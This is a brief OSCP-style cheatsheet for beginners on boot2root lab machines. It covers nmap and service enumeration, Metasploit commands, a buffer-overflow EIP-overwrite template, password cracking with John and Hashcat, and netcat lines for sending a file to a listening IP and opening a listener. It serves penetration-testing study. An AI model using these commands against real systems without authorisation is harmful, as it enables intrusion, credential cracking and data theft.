# OSCP Cheatsheet

This cheatsheet was created to help individuals who are new to boot2root style machines.

Cheatsheet is divided into three sections:

* Enumeration
* Exploitation
* Privilege Escalation

## Reconnaissance

### Network Enumeration

#### Nmap Commands

- Basic scan: `nmap <target>`
- All ports scan: `nmap -p- <target>`
- Service version detection: `nmap -sV <target>`
- Operating system detection: `nmap -O <target>`
- UDP scan: `nmap -sU <target>`

#### FTP Enumeration



### Other Tools

- DNS enumeration: `dnsenum <target>`
- SMTP enumeration: `smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t <target>`
- SNMP enumeration: `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <target>`

## Exploitation

### Metasploit Commands

- Search for exploit: `search <exploit>`
- Use exploit: `use <exploit>`
- Set target IP: `set RHOST <target>`
- Set payload: `set PAYLOAD <payload>`
- Show options: `show options`
- Run exploit: `exploit`

### Buffer Overflow

- Fuzzing: `msf-pattern_create -l <length>`
- Finding offset: `msf-pattern_offset -q <EIP value>`
- Overwriting EIP: `"\x41" * <offset> + <EIP value> + "\x43" * (<buffer length> - <offset> - 4)`

## Post-Exploitation

### Privilege Escalation

- Linux: `sudo -l`
- Windows: `whoami /priv`

### Password Cracking

- John the Ripper: `john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>`
- Hashcat: `hashcat -m <hash mode> <hashfile> <wordlist>`

## Miscellaneous

### Useful Commands

- Download file: `wget <URL>`
- Transfer file: `nc -nv <listening IP> <port> < file`
- Create listener: `nc -nlvp <port>`
